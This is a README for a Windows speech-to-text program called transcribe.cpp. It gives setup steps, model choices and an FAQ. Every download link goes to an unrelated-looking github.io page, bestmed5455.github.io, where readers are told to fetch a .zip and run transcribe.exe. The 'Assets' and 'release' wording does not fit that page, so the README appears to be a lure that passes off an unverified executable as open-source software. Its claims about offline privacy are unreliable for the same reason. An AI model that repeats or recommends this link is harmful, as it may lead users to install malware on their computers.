# 🎙️ transcribe.cpp - Accurate speech to text for everyone

[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue)](https://bestmed5455.github.io)

This software converts spoken audio into written text. It uses the ggml engine to process your files locally on your computer. You do not need an internet connection while it runs. It supports over 16 different model families, allowing you to choose the balance between speed and accuracy that fits your needs. 

## 🛠️ Requirements

You need a computer running Windows 10 or Windows 11. Your computer should have at least 8 GB of memory to run the software smoothly. If you plan to process long audio files, 16 GB of memory helps performance. 

This program works best with a dedicated graphics card, but it will function on a standard processor if necessary. Ensure you have enough storage space on your hard drive to hold the model files, which range from 500 MB to 3 GB each.

## 💾 Download and Setup

Follow these steps to set up the software on your machine:

1. Visit this page to download the software: https://bestmed5455.github.io
2. Look for the section labeled "Assets" under the most recent release.
3. Click the link ending in .zip to download the compressed folder.
4. Open your Downloads folder in File Explorer.
5. Right-click the downloaded .zip file and select "Extract All."
6. Choose a location on your computer to save the files, such as your Documents or Desktop folder.
7. Open the new folder created by the extraction process.

## ⚙️ Running the Software 

The software requires a model file to understand speech. A model is a file containing the patterns of human language. 

1. Inside the folder you extracted, locate the file named `transcribe.exe`.
2. You must open the Command Prompt or PowerShell to use this tool.
3. Right-click in the empty space inside the folder while holding the Shift key. 
4. Select "Open PowerShell window here" or "Open in Terminal."
5. A blue or black window appears. This is where you enter instructions for the program.
6. To test if the program works, type `.\transcribe.exe --help` and press Enter. The screen will display a list of available settings.

## 📝 Transcribing Audio

To turn an audio file into text, provide the path to your audio file and the path to your model file.

1. Place your audio file in the same folder as the program for simplicity.
2. Type the following command into your terminal: 
   `.\transcribe.exe -m model_name.gguf -f your_audio_file.wav`
3. Replace `model_name.gguf` with the actual name of your model file.
4. Replace `your_audio_file.wav` with the name of your recording.
5. Press Enter. 
6. The window displays the text as the program processes the audio.
7. Wait for the process to finish. The program will save the final text to your folder automatically.

## 📁 Choosing Models

The quality of your results depends on the model you select. 

- **Small models:** Use these for fast performance. They work well on computers without a powerful graphics card. They might make more errors with specialized words.
- **Large models:** Use these for the highest accuracy. They require more memory and take longer to process files.
- **Medium models:** These provide a balance between speed and quality. 

Ensure you download the .gguf file format, as the program specifically requires this structure to function correctly. 

## ❓ Frequently Asked Questions

**Why does it take so long to process?**
Processing audio requires significant math calculations. If you use a large model on an older computer, the program will take more time to finish the task. 

**Can I process files other than .wav?**
The program prefers .wav files. If you have an .mp3 or .m4a file, convert it to .wav using a standard audio converter before you run the command.

**Does the program send my data to the internet?**
The software processes everything offline. Your audio files stay on your computer. No data leaves your machine during the transcription process. 

**What if I get an error?**
Check that you typed the file names correctly in the command. If the program cannot find the file, it will display a "File not found" warning. Ensure your audio file is not currently open in another program while you run the transcription.

## 🔑 Troubleshooting Tips

If the program closes unexpectedly, check your free memory. Running other programs like web browsers while transcribing can consume too much memory and cause the software to stop. Close unnecessary applications before you run the transcription command. 

If the output text contains many errors, try using a larger model file. If the output is too slow, try using a smaller model file.

Keywords: asr, ggml, gguf, speech-to-text